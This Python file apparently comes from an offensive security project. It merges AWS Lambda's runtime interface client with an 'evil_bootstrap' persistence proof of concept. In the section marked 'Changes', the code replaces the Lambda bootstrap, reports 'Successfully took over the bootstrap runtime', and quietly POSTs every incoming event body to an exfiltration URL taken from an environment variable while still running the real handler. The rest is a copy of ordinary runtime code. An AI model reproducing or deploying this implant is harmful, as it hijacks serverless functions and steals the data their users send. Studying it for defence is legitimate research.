"""
This file is a mix of the files from https://github.com/aws/aws-lambda-python-runtime-interface-client/tree/main/awslambdaric + some changes from https://github.com/Djkusik/serverless_persistency_poc/blob/master/aws/exploit_files/evil_bootstrap.py + some custom changes
"""

import sys
sys.path.insert(0, '/var/lang/lib/python3.7/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.8/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.9/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.10/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.11/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.12/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.13/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.14/site-packages/awslambdaric')
sys.path.insert(0, '/var/lang/lib/python3.15/site-packages/awslambdaric')


### lambda_runtime_marshaller.py
"""
Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved.
"""

import decimal
import math
import os
import simplejson as json


# simplejson's Decimal encoding allows '-NaN' as an output, which is a parse error for json.loads
# to get the good parts of Decimal support, we'll special-case NaN decimals and otherwise duplicate the encoding for decimals the same way simplejson does
# We also set 'ensure_ascii=False' so that the encoded json contains unicode characters instead of unicode escape sequences
class Encoder(json.JSONEncoder):
    def __init__(self):
        if os.environ.get("AWS_EXECUTION_ENV") == "AWS_Lambda_python3.12":
            super().__init__(use_decimal=False, ensure_ascii=False)
        else:
            super().__init__(use_decimal=False)

    def default(self, obj):
        if isinstance(obj, decimal.Decimal):
            if obj.is_nan():
                return math.nan
            return json.raw_json.RawJSON(str(obj))
        return super().default(obj)


def to_json(obj):
    return Encoder().encode(obj)


class LambdaMarshaller:
    def __init__(self):
        self.jsonEncoder = Encoder()

    def unmarshal_request(self, request, content_type="application/json"):
        if content_type != "application/json":
            return request
        try:
            return json.loads(request)
        except Exception as e:
            raise FaultException(
                FaultException.UNMARSHAL_ERROR,
                "Unable to unmarshal input: {}".format(str(e)),
                None,
            )

    def marshal_response(self, response):
        if isinstance(response, bytes):
            return response, "application/unknown"

        try:
            return self.jsonEncoder.encode(response), "application/json"
        except Exception as e:
            raise FaultException(
                FaultException.MARSHAL_ERROR,
                "Unable to marshal response: {}".format(str(e)),
                None,
            )
###


### lambda_context.py
"""
Copyright 2020 Amazon.com, Inc. or its affiliates. All Rights Reserved.
"""

import logging
import os
import sys
import time


class LambdaContext(object):
    def __init__(
        self,
        invoke_id,
        client_context,
        cognito_identity,
        epoch_deadline_time_in_ms,
        invoked_function_arn=None,
    ):
        self.aws_request_id = invoke_id
        self.log_group_name = os.environ.get("AWS_LAMBDA_LOG_GROUP_NAME")
        self.log_stream_name = os.environ.get("AWS_LAMBDA_LOG_STREAM_NAME")
        self.function_name = os.environ.get("AWS_LAMBDA_FUNCTION_NAME")
        self.memory_limit_in_mb = os.environ.get("AWS_LAMBDA_FUNCTION_MEMORY_SIZE")
        self.function_version = os.environ.get("AWS_LAMBDA_FUNCTION_VERSION")
        self.invoked_function_arn = invoked_function_arn

        self.client_context = make_obj_from_dict(ClientContext, client_context)
        if self.client_context is not None:
            self.client_context.client = make_obj_from_dict(
                Client, self.client_context.client
            )

        self.identity = make_obj_from_dict(CognitoIdentity, {})
        if cognito_identity is not None:
            self.identity.cognito_identity_id = cognito_identity.get(
                "cognitoIdentityId"
            )
            self.identity.cognito_identity_pool_id = cognito_identity.get(
                "cognitoIdentityPoolId"
            )

        self._epoch_deadline_time_in_ms = epoch_deadline_time_in_ms

    def get_remaining_time_in_millis(self):
        epoch_now_in_ms = int(time.time() * 1000)
        delta_ms = self._epoch_deadline_time_in_ms - epoch_now_in_ms
        return delta_ms if delta_ms > 0 else 0

    def log(self, msg):
        for handler in logging.getLogger().handlers:
            if hasattr(handler, "log_sink"):
                handler.log_sink.log(str(msg))
                return
        sys.stdout.write(str(msg))

    def __repr__(self):
        return (
            f"{self.__class__.__name__}(["
            f"aws_request_id={self.aws_request_id},"
            f"log_group_name={self.log_group_name},"
            f"log_stream_name={self.log_stream_name},"
            f"function_name={self.function_name},"
            f"memory_limit_in_mb={self.memory_limit_in_mb},"
            f"function_version={self.function_version},"
            f"invoked_function_arn={self.invoked_function_arn},"
            f"client_context={self.client_context},"
            f"identity={self.identity}"
            "])"
        )


class CognitoIdentity(object):
    __slots__ = ["cognito_identity_id", "cognito_identity_pool_id"]

    def __repr__(self):
        return (
            f"{self.__class__.__name__}(["
            f"cognito_identity_id={self.cognito_identity_id},"
            f"cognito_identity_pool_id={self.cognito_identity_pool_id}"
            "])"
        )


class Client(object):
    __slots__ = [
        "installation_id",
        "app_title",
        "app_version_name",
        "app_version_code",
        "app_package_name",
    ]

    def __repr__(self):
        return (
            f"{self.__class__.__name__}(["
            f"installation_id={self.installation_id},"
            f"app_title={self.app_title},"
            f"app_version_name={self.app_version_name},"
            f"app_version_code={self.app_version_code},"
            f"app_package_name={self.app_package_name}"
            "])"
        )


class ClientContext(object):
    __slots__ = ["custom", "env", "client"]

    def __repr__(self):
        return (
            f"{self.__class__.__name__}(["
            f"custom={self.custom},"
            f"env={self.env},"
            f"client={self.client}"
            "])"
        )


def make_obj_from_dict(_class, _dict, fields=None):
    if _dict is None:
        return None
    obj = _class()
    set_obj_from_dict(obj, _dict)
    return obj


def set_obj_from_dict(obj, _dict, fields=None):
    if fields is None:
        fields = obj.__class__.__slots__
    for field in fields:
        setattr(obj, field, _dict.get(field, None))

###
        

### lambda_literals.py
"""
Copyright 2023 Amazon.com, Inc. or its affiliates. All Rights Reserved.
"""

lambda_warning = "LAMBDA_WARNING"

# Holds warning message that is emitted when an unhandled exception is raised during function invocation.
lambda_unhandled_exception_warning_message = str(
    f"{lambda_warning}: "
    "Unhandled exception. "
    "The most likely cause is an issue in the function code. "
    "However, in rare cases, a Lambda runtime update can cause unexpected function behavior. "
    "For functions using managed runtimes, runtime updates can be triggered by a function change, or can be applied automatically. "
    "To determine if the runtime has been updated, check the runtime version in the INIT_START log entry. "
    "If this error correlates with a change in the runtime version, you may be able to mitigate this error by temporarily rolling back to the previous runtime version. "
    "For more information, see https://docs.aws.amazon.com/lambda/latest/dg/runtimes-update.html\r"
)
###


### lambda_runtime_client.py
"""
Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved.
"""

import sys
from awslambdaric import __version__


def _user_agent():
    py_version = (
        f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
    )
    pkg_version = __version__
    return f"aws-lambda-python/{py_version}-{pkg_version}"


try:
    import runtime_client

    runtime_client.initialize_client(_user_agent())
except ImportError:
    runtime_client = None


class InvocationRequest(object):
    def __init__(self, **kwds):
        self.__dict__.update(kwds)

    def __eq__(self, other):
        return self.__dict__ == other.__dict__


class LambdaRuntimeClientError(Exception):
    def __init__(self, endpoint, response_code, response_body):
        self.endpoint = endpoint
        self.response_code = response_code
        self.response_body = response_body
        super().__init__(
            f"Request to Lambda Runtime '{endpoint}' endpoint failed. Reason: '{response_code}'. Response body: '{response_body}'"
        )


class LambdaRuntimeClient(object):
    marshaller = LambdaMarshaller()
    """marshaller is a class attribute that determines the unmarshalling and marshalling logic of a function's event
    and response. It allows for function authors to override the the default implementation, LambdaMarshaller which
    unmarshals and marshals JSON, to an instance of a class that implements the same interface."""

    def __init__(self, lambda_runtime_address, use_thread_for_polling_next=False):
        self.lambda_runtime_address = lambda_runtime_address
        self.use_thread_for_polling_next = use_thread_for_polling_next
        if self.use_thread_for_polling_next:
            # Conditionally import only for the case when TPE is used in this class.
            from concurrent.futures import ThreadPoolExecutor

            # Not defining symbol as global to avoid relying on TPE being imported unconditionally.
            self.ThreadPoolExecutor = ThreadPoolExecutor

    def post_init_error(self, error_response_data):
        # These imports are heavy-weight. They implicitly trigger `import ssl, hashlib`.
        # Importing them lazily to speed up critical path of a common case.
        import http
        import http.client

        runtime_connection = http.client.HTTPConnection(self.lambda_runtime_address)
        runtime_connection.connect()
        endpoint = "/2018-06-01/runtime/init/error"
        runtime_connection.request("POST", endpoint, error_response_data)
        response = runtime_connection.getresponse()
        response_body = response.read()

        if response.code != http.HTTPStatus.ACCEPTED:
            raise LambdaRuntimeClientError(endpoint, response.code, response_body)

    def wait_next_invocation(self):
        # Calling runtime_client.next() from a separate thread unblocks the main thread,
        # which can then process signals.
        if self.use_thread_for_polling_next:
            try:
                # TPE class is supposed to be registered at construction time and be ready to use.
                with self.ThreadPoolExecutor(max_workers=1) as executor:
                    future = executor.submit(runtime_client.next)
                response_body, headers = future.result()
            except Exception as e:
                raise FaultException(
                    FaultException.LAMBDA_RUNTIME_CLIENT_ERROR,
                    "LAMBDA_RUNTIME Failed to get next invocation: {}".format(str(e)),
                    None,
                )
        else:
            response_body, headers = runtime_client.next()
        return InvocationRequest(
            invoke_id=headers.get("Lambda-Runtime-Aws-Request-Id"),
            x_amzn_trace_id=headers.get("Lambda-Runtime-Trace-Id"),
            invoked_function_arn=headers.get("Lambda-Runtime-Invoked-Function-Arn"),
            deadline_time_in_ms=headers.get("Lambda-Runtime-Deadline-Ms"),
            client_context=headers.get("Lambda-Runtime-Client-Context"),
            cognito_identity=headers.get("Lambda-Runtime-Cognito-Identity"),
            content_type=headers.get("Content-Type"),
            event_body=response_body,
        )

    def post_invocation_result(
        self, invoke_id, result_data, content_type="application/json"
    ):
        runtime_client.post_invocation_result(
            invoke_id,
            (
                result_data
                if isinstance(result_data, bytes)
                else result_data.encode("utf-8")
            ),
            content_type,
        )

    def post_invocation_error(self, invoke_id, error_response_data, xray_fault):
        max_header_size = 1024 * 1024  # 1MiB
        xray_fault = xray_fault if len(xray_fault.encode()) < max_header_size else ""
        runtime_client.post_error(invoke_id, error_response_data, xray_fault)
###
        
### lambda_runtime_exception.py
"""
Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved.
"""


class FaultException(Exception):
    MARSHAL_ERROR = "Runtime.MarshalError"
    UNMARSHAL_ERROR = "Runtime.UnmarshalError"
    USER_CODE_SYNTAX_ERROR = "Runtime.UserCodeSyntaxError"
    HANDLER_NOT_FOUND = "Runtime.HandlerNotFound"
    IMPORT_MODULE_ERROR = "Runtime.ImportModuleError"
    BUILT_IN_MODULE_CONFLICT = "Runtime.BuiltInModuleConflict"
    MALFORMED_HANDLER_NAME = "Runtime.MalformedHandlerName"
    LAMBDA_CONTEXT_UNMARSHAL_ERROR = "Runtime.LambdaContextUnmarshalError"
    LAMBDA_RUNTIME_CLIENT_ERROR = "Runtime.LambdaRuntimeClientError"

    def __init__(self, exception_type, msg, trace=None):
        self.msg = msg
        self.exception_type = exception_type
        self.trace = trace
###
        
### lambda_runtime_log_utils.py
"""
Copyright 2023 Amazon.com, Inc. or its affiliates. All Rights Reserved.
"""

import json
import logging
import traceback
from enum import IntEnum

_DATETIME_FORMAT = "%Y-%m-%dT%H:%M:%SZ"
_RESERVED_FIELDS = {
    "name",
    "msg",
    "args",
    "levelname",
    "levelno",
    "pathname",
    "filename",
    "module",
    "exc_info",
    "exc_text",
    "stack_info",
    "lineno",
    "funcName",
    "created",
    "msecs",
    "relativeCreated",
    "thread",
    "threadName",
    "processName",
    "process",
    "aws_request_id",
    "_frame_type",
}


class LogFormat(IntEnum):
    JSON = 0b0
    TEXT = 0b1

    @classmethod
    def from_str(cls, value: str):
        if value and value.upper() == "JSON":
            return cls.JSON.value
        return cls.TEXT.value


def _get_log_level_from_env_var(log_level):
    return {None: "", "TRACE": "DEBUG"}.get(log_level, log_level).upper()


_JSON_FRAME_TYPES = {
    logging.NOTSET: 0xA55A0002.to_bytes(4, "big"),
    logging.DEBUG: 0xA55A000A.to_bytes(4, "big"),
    logging.INFO: 0xA55A000E.to_bytes(4, "big"),
    logging.WARNING: 0xA55A0012.to_bytes(4, "big"),
    logging.ERROR: 0xA55A0016.to_bytes(4, "big"),
    logging.CRITICAL: 0xA55A001A.to_bytes(4, "big"),
}
_TEXT_FRAME_TYPES = {
    logging.NOTSET: 0xA55A0003.to_bytes(4, "big"),
    logging.DEBUG: 0xA55A000B.to_bytes(4, "big"),
    logging.INFO: 0xA55A000F.to_bytes(4, "big"),
    logging.WARNING: 0xA55A0013.to_bytes(4, "big"),
    logging.ERROR: 0xA55A0017.to_bytes(4, "big"),
    logging.CRITICAL: 0xA55A001B.to_bytes(4, "big"),
}
_DEFAULT_FRAME_TYPE = _TEXT_FRAME_TYPES[logging.NOTSET]

_json_encoder = json.JSONEncoder(ensure_ascii=False)
_encode_json = _json_encoder.encode


def _format_log_level(record: logging.LogRecord) -> int:
    return min(50, max(0, record.levelno)) // 10 * 10


class JsonFormatter(logging.Formatter):
    def __init__(self):
        super().__init__(datefmt=_DATETIME_FORMAT)

    @staticmethod
    def __format_stacktrace(exc_info):
        if not exc_info:
            return None
        return traceback.format_tb(exc_info[2])

    @staticmethod
    def __format_exception_name(exc_info):
        if not exc_info:
            return None

        return exc_info[0].__name__

    @staticmethod
    def __format_exception(exc_info):
        if not exc_info:
            return None

        return str(exc_info[1])

    @staticmethod
    def __format_location(record: logging.LogRecord):
        if not record.exc_info:
            return None

        return f"{record.pathname}:{record.funcName}:{record.lineno}"

    def format(self, record: logging.LogRecord) -> str:
        record.levelno = _format_log_level(record)
        record.levelname = logging.getLevelName(record.levelno)
        record._frame_type = _JSON_FRAME_TYPES.get(
            record.levelno, _JSON_FRAME_TYPES[logging.NOTSET]
        )

        result = {
            "timestamp": self.formatTime(record, self.datefmt),
            "level": record.levelname,
            "message": record.getMessage(),
            "logger": record.name,
            "stackTrace": self.__format_stacktrace(record.exc_info),
            "errorType": self.__format_exception_name(record.exc_info),
            "errorMessage": self.__format_exception(record.exc_info),
            "requestId": getattr(record, "aws_request_id", None),
            "location": self.__format_location(record),
        }
        result.update(
            (key, value)
            for key, value in record.__dict__.items()
            if key not in _RESERVED_FIELDS and key not in result
        )

        result = {k: v for k, v in result.items() if v is not None}

        return _encode_json(result) + "\n"
###


### bootstrap.py

"""
Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved.
Original from https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py
Modifications from https://raw.githubusercontent.com/Djkusik/serverless_persistency_poc/master/aws/exploit_files/evil_bootstrap.py and custom
"""

import json
import logging
import os
import site
import sys
import time
import traceback
import warnings

with warnings.catch_warnings():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    import imp

ERROR_LOG_LINE_TERMINATE = '\r'
ERROR_LOG_IDENT = '\u00a0'  # NO-BREAK SPACE U+00A0


def _get_handler(handler):
    try:
        (modname, fname) = handler.rsplit('.', 1)
    except ValueError as e:
        fault = FaultException(FaultException.MALFORMED_HANDLER_NAME, "Bad handler '{}': {}".format(handler, str(e)))
        return make_fault_handler(fault)

    file_handle, pathname, desc = None, None, None
    try:
        # Recursively loading handler in nested directories
        for segment in modname.split('.'):
            if pathname is not None:
                pathname = [pathname]
            file_handle, pathname, desc = imp.find_module(segment, pathname)
        if file_handle is None:
            module_type = desc[2]
            if module_type == imp.C_BUILTIN:
                fault = FaultException(FaultException.BUILT_IN_MODULE_CONFLICT, "Cannot use built-in module {} as a handler module".format(modname))
                request_handler = make_fault_handler(fault)
                return request_handler
        m = imp.load_module(modname, file_handle, pathname, desc)
    except ImportError as e:
        fault = FaultException(FaultException.IMPORT_MODULE_ERROR, "Unable to import module '{}': {}".format(modname, str(e)))
        request_handler = make_fault_handler(fault)
        return request_handler
    except SyntaxError as e:
        trace = [ "  File \"%s\" Line %s\n    %s" % (e.filename, e.lineno, e.text) ]
        fault = FaultException(FaultException.USER_CODE_SYNTAX_ERROR, "Syntax error in module '{}': {}".format(modname, str(e)), trace)
        request_handler = make_fault_handler(fault)
        return request_handler
    finally:
        if file_handle is not None:
            file_handle.close()

    try:
        request_handler = getattr(m, fname)
    except AttributeError:
        fault = FaultException(FaultException.HANDLER_NOT_FOUND, "Handler '{}' missing on module '{}'".format(fname, modname), None)
        request_handler = make_fault_handler(fault)
    return request_handler


def make_fault_handler(fault):
    def result(*args):
        raise fault

    return result


def make_error(error_message, error_type, stack_trace):
    result = {'errorMessage': error_message if error_message else "",
              'errorType': error_type if error_type else "",
              'stackTrace': stack_trace if stack_trace else []}
    return result


def replace_line_indentation(line, indent_char, new_indent_char):
    ident_chars_count = 0
    for c in line:
        if c != indent_char:
            break
        ident_chars_count += 1
    return (new_indent_char * ident_chars_count) + line[ident_chars_count:]


def log_error(error_result, log_sink):
    error_description = "[ERROR]"

    error_result_type = error_result.get('errorType')
    if error_result_type:
        error_description += " " + error_result_type

    error_result_message = error_result.get('errorMessage')
    if error_result_message:
        if error_result_type:
            error_description += ":"
        error_description += " " + error_result_message

    error_message_lines = [error_description]

    stack_trace = error_result.get('stackTrace')
    if stack_trace is not None:
        error_message_lines += ["Traceback (most recent call last):"]
        for trace_element in stack_trace:
            if trace_element == "":
                error_message_lines += [""]
            else:
                for trace_line in trace_element.splitlines():
                    error_message_lines += [replace_line_indentation(trace_line, ' ', ERROR_LOG_IDENT)]

    log_sink.log_error(error_message_lines)


def parse_json_header(header, name):
    try:
        return json.loads(header)
    except Exception as e:
        raise FaultException(FaultException.LAMBDA_CONTEXT_UNMARSHAL_ERROR,
                             "Unable to parse {} JSON: {}".format(name, str(e)), None)


def create_lambda_context(client_context_json, cognito_identity_json, epoch_deadline_time_in_ms, invoke_id,
                          invoked_function_arn):
    client_context = None
    if client_context_json:
        client_context = parse_json_header(client_context_json, "Client Context")
    cognito_identity = None
    if cognito_identity_json:
        cognito_identity = parse_json_header(cognito_identity_json, "Cognito Identity")
    return LambdaContext(invoke_id, client_context, cognito_identity, epoch_deadline_time_in_ms,
                         invoked_function_arn)


def build_fault_result(exc_info, msg):
    etype, value, tb = exc_info
    tb_tuples = extract_traceback(tb)
    for i in range(len(tb_tuples)):
        if "/bootstrap.py" not in tb_tuples[i][0]:  # filename of the tb tuple
            tb_tuples = tb_tuples[i:]
            break

    return make_error(msg if msg else str(value), etype.__name__, traceback.format_list(tb_tuples))


def make_xray_fault(ex_type, ex_msg, working_dir, tb_tuples):
    stack = []
    files = set()
    for t in tb_tuples:
        tb_file, tb_line, tb_method, tb_code = t
        tb_xray = {
            'label': tb_method,
            'path': tb_file,
            'line': tb_line
        }
        stack.append(tb_xray)
        files.add(tb_file)

    formatted_ex = {
        'message': ex_msg,
        'type': ex_type,
        'stack': stack
    }
    xray_fault = {
        'working_directory': working_dir,
        'exceptions': [formatted_ex],
        'paths': list(files)
    }
    return xray_fault


def extract_traceback(tb):
    return [(frame.filename, frame.lineno, frame.name, frame.line) for frame in traceback.extract_tb(tb)]


class CognitoIdentity(object):
    __slots__ = ["cognito_identity_id", "cognito_identity_pool_id"]


class Client(object):
    __slots__ = ["installation_id", "app_title", "app_version_name", "app_version_code", "app_package_name"]


class ClientContext(object):
    __slots__ = ['custom', 'env', 'client']


def make_obj_from_dict(_class, _dict, fields=None):
    if _dict is None:
        return None
    obj = _class()
    set_obj_from_dict(obj, _dict)
    return obj


def set_obj_from_dict(obj, _dict, fields=None):
    if fields is None:
        fields = obj.__class__.__slots__
    for field in fields:
        setattr(obj, field, _dict.get(field, None))


class LambdaContext(object):
    def __init__(self, invoke_id, client_context, cognito_identity, epoch_deadline_time_in_ms,
                 invoked_function_arn=None):
        self.aws_request_id = invoke_id
        self.log_group_name = os.environ.get('AWS_LAMBDA_LOG_GROUP_NAME')
        self.log_stream_name = os.environ.get('AWS_LAMBDA_LOG_STREAM_NAME')
        self.function_name = os.environ.get("AWS_LAMBDA_FUNCTION_NAME")
        self.memory_limit_in_mb = os.environ.get('AWS_LAMBDA_FUNCTION_MEMORY_SIZE')
        self.function_version = os.environ.get('AWS_LAMBDA_FUNCTION_VERSION')
        self.invoked_function_arn = invoked_function_arn

        self.client_context = make_obj_from_dict(ClientContext, client_context)
        if self.client_context is not None:
            self.client_context.client = make_obj_from_dict(Client, self.client_context.client)

        self.identity = make_obj_from_dict(CognitoIdentity, {})
        if cognito_identity is not None:
            self.identity.cognito_identity_id = cognito_identity.get("cognitoIdentityId")
            self.identity.cognito_identity_pool_id = cognito_identity.get("cognitoIdentityPoolId")

        self._epoch_deadline_time_in_ms = epoch_deadline_time_in_ms

    def get_remaining_time_in_millis(self):
        epoch_now_in_ms = int(time.time() * 1000)
        delta_ms = self._epoch_deadline_time_in_ms - epoch_now_in_ms
        return delta_ms if delta_ms > 0 else 0

    def log(self, msg):
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'log_sink'):
                handler.log_sink.log(str(msg))
                return
        sys.stdout.write(str(msg))


class LambdaLoggerHandler(logging.Handler):
    def __init__(self, log_sink):
        logging.Handler.__init__(self)
        self.log_sink = log_sink

    def emit(self, record):
        msg = self.format(record)
        self.log_sink.log(msg)


class LambdaLoggerFilter(logging.Filter):
    def filter(self, record):
        record.aws_request_id = _GLOBAL_AWS_REQUEST_ID or ""
        return True


class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, exc_tb):
        pass

    def __getattr__(self, attr):
        return getattr(self.stream, attr)

    def write(self, msg):
        self.stream.write(msg)
        self.stream.flush()

    def writelines(self, msgs):
        self.stream.writelines(msgs)
        self.stream.flush()


class StandardLogSink(object):

    def __init__(self):
        pass

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, exc_tb):
        pass

    def log(self, msg):
        sys.stdout.write(msg)

    def log_error(self, message_lines):
        error_message = ERROR_LOG_LINE_TERMINATE.join(message_lines) + '\n'
        sys.stdout.write(error_message)


class FramedTelemetryLogSink(object):
    """
    FramedTelemetryLogSink implements the logging contract between runtimes and the platform. It implements a simple
    framing protocol so message boundaries can be determined. Each frame can be visualized as follows:
     <pre>
    {@code
    +----------------------+------------------------+-----------------------+
    | Frame Type - 4 bytes | Length (len) - 4 bytes | Message - 'len' bytes |
    +----------------------+------------------------+-----------------------+
    }
    </pre>
    The first 4 bytes indicate the type of the frame - log frames have a type defined as the hex value 0xa55a0001. The
    second 4 bytes should indicate the message's length. The next 'len' bytes contain the message. The byte order is
    big-endian.
    """

    def __init__(self, filename):
        self.filename = filename
        self.frame_type = 0xa55a0001.to_bytes(4, 'big')

    def __enter__(self):
        self.file = open(self.filename, 'wb', 0)
        return self

    def __exit__(self, exc_type, exc_value, exc_tb):
        self.file.close()

    def log(self, msg):
        encoded_msg = msg.encode("utf8")
        log_msg = self.frame_type + len(encoded_msg).to_bytes(4, 'big') + encoded_msg
        self.file.write(log_msg)

    def log_error(self, message_lines):
        error_message = '\n'.join(message_lines)
        self.log(error_message)


def is_pythonpath_set():
    return "PYTHONPATH" in os.environ


def get_opt_site_packages_directory():
    return '/opt/python/lib/python{}.{}/site-packages'.format(sys.version_info.major, sys.version_info.minor)


def get_opt_python_directory():
    return '/opt/python'


# set default sys.path for discoverability
# precedence: /var/task -> /opt/python/lib/pythonN.N/site-packages -> /opt/python
def set_default_sys_path():
    if not is_pythonpath_set():
        sys.path.insert(0, get_opt_python_directory())
        sys.path.insert(0, get_opt_site_packages_directory())
    # '/var/task' is function author's working directory
    # we add it first in order to mimic the default behavior of populating sys.path and make modules under '/var/task'
    # discoverable - https://docs.python.org/3/library/sys.html#sys.path
    sys.path.insert(0, os.environ['LAMBDA_TASK_ROOT'])


def add_default_site_directories():
    # Set '/var/task as site directory so that we are able to load all customer .pth files
    site.addsitedir(os.environ["LAMBDA_TASK_ROOT"])
    if not is_pythonpath_set():
        site.addsitedir(get_opt_site_packages_directory())
        site.addsitedir(get_opt_python_directory())

def set_default_pythonpath():
    if not is_pythonpath_set():
        # keep consistent with documentation: https://docs.aws.amazon.com/lambda/latest/dg/lambda-environment-variables.html
        os.environ["PYTHONPATH"] = os.environ["LAMBDA_RUNTIME_DIR"]


def update_xray_env_variable(xray_trace_id):
    if xray_trace_id is not None:
        os.environ['_X_AMZN_TRACE_ID'] = xray_trace_id
    else:
        if '_X_AMZN_TRACE_ID' in os.environ:
            del os.environ['_X_AMZN_TRACE_ID']


def create_log_sink():
    if '_LAMBDA_TELEMETRY_LOG_FD' in os.environ:
        fd = os.environ['_LAMBDA_TELEMETRY_LOG_FD']
        del os.environ['_LAMBDA_TELEMETRY_LOG_FD']
        return FramedTelemetryLogSink('/proc/self/fd/' + fd)

    else:
        return StandardLogSink()


_GLOBAL_AWS_REQUEST_ID = None

# -------------------------------- Changes -------------------------------- #
# -------------------------------- Changes -------------------------------- #

HARDCODED_INIT_PROCESS_API = "127.0.0.1:9001"

def main(invoke_id):
    set_default_sys_path()
    add_default_site_directories()
    set_default_pythonpath()
    sys.stdout = Unbuffered(sys.stdout)
    sys.stderr = Unbuffered(sys.stderr)
    log_sink = create_log_sink()

    lambda_runtime_client = LambdaRuntimeClient(HARDCODED_INIT_PROCESS_API)

    if not respond_to_payload_invoke(lambda_runtime_client, invoke_id):
        return

    event_request = lambda_runtime_client.wait_next_invocation()

    try:
        logging.Formatter.converter = time.gmtime
        logger = logging.getLogger()
        logger_handler = LambdaLoggerHandler(log_sink)
        logger_handler.setFormatter(logging.Formatter(
            '[%(levelname)s]\t%(asctime)s.%(msecs)03dZ\t%(aws_request_id)s\t%(message)s\n',
            '%Y-%m-%dT%H:%M:%S'
        ))
        logger_handler.addFilter(LambdaLoggerFilter())
        logger.addHandler(logger_handler)

        global _GLOBAL_AWS_REQUEST_ID

        handler = os.environ["_HANDLER"]
        request_handler = _get_handler(handler)
    except Exception as e:
        print("[!] Initialization failed: " + repr(e))
        return

    while True:
        _GLOBAL_AWS_REQUEST_ID = event_request.invoke_id

        update_xray_env_variable(event_request.x_amzn_trace_id)

        handle_event_request(lambda_runtime_client,
                                request_handler,
                                event_request.invoke_id,
                                event_request.event_body,
                                event_request.content_type,
                                event_request.client_context,
                                event_request.cognito_identity,
                                event_request.invoked_function_arn,
                                event_request.deadline_time_in_ms,
                                log_sink)
        
        event_request = lambda_runtime_client.wait_next_invocation()


def respond_to_payload_invoke(lambda_runtime_client, invoke_id):
    response = {
        "isBase64Encoded": False,
        "statusCode" : 200,
        "headers" : {"Content-Type" : "text/plain"},
        "body" : json.dumps({"Output" : "Successfully took over the bootstrap runtime"})
    }

    try:
        result, result_content_type = lambda_runtime_client.marshaller.marshal_response(response) 
    except Exception as e:
        print("[!] twist_respond_to_payload_invoke: Failed to marshal response: '{}'".repr(e))
        return False
    
    try:
        lambda_runtime_client.post_invocation_result(invoke_id, result, result_content_type)
    except Exception as e:
        print("[!] twist_respond_to_payload_invoke: Failed with invoke_id: '{}'".format(invoke_id))
        return False

    return True


def handle_event_request(lambda_runtime_client, request_handler, invoke_id, event_body, content_type,
                         client_context_json, cognito_identity_json, invoked_function_arn, epoch_deadline_time_in_ms,
                         log_sink):
    error_result = None
    try:
        lambda_context = create_lambda_context(client_context_json, cognito_identity_json, epoch_deadline_time_in_ms,
                                               invoke_id, invoked_function_arn)
        event = lambda_runtime_client.marshaller.unmarshal_request(event_body, content_type)
        exfiltrate_data(event, invoke_id)
        response = request_handler(event, lambda_context)
        result, result_content_type = lambda_runtime_client.marshaller.marshal_response(response)
    except FaultException as e:
        xray_fault = make_xray_fault("LambdaValidationError", e.msg, os.getcwd(), [])
        error_result = make_error(e.msg, e.exception_type, e.trace)

    except Exception:
        etype, value, tb = sys.exc_info()
        tb_tuples = extract_traceback(tb)
        for i in range(len(tb_tuples)):
            if "/bootstrap.py" not in tb_tuples[i][0]:  # filename of the tb tuple
                tb_tuples = tb_tuples[i:]
                break

        xray_fault = make_xray_fault(etype.__name__, str(value), os.getcwd(), tb_tuples)
        error_result = make_error(str(value), etype.__name__, traceback.format_list(tb_tuples))

    if error_result is not None:
        log_error(error_result, log_sink)
        lambda_runtime_client.post_invocation_error(invoke_id, to_json(error_result), to_json(xray_fault))
    else:
        lambda_runtime_client.post_invocation_result(invoke_id, result, result_content_type)


def exfiltrate_data(event, invoke_id):
    try:
        import urllib3
        addr = os.getenv("URL_EXFIL")
        http = urllib3.PoolManager()
        http.request("POST", addr, fields={"event_body": str(event)}, timeout=0.1, retries=False)
    except Exception as err:
        pass
        #print(f"[!] Failed to send event {invoke_id} : {repr(err)}")

import urllib3
http = urllib3.PoolManager()
resp = http.request("GET", "127.0.0.1:9001/2018-06-01/runtime/invocation/next")
invoke_id = resp.headers["Lambda-Runtime-Aws-Request-Id"]
main(invoke_id)
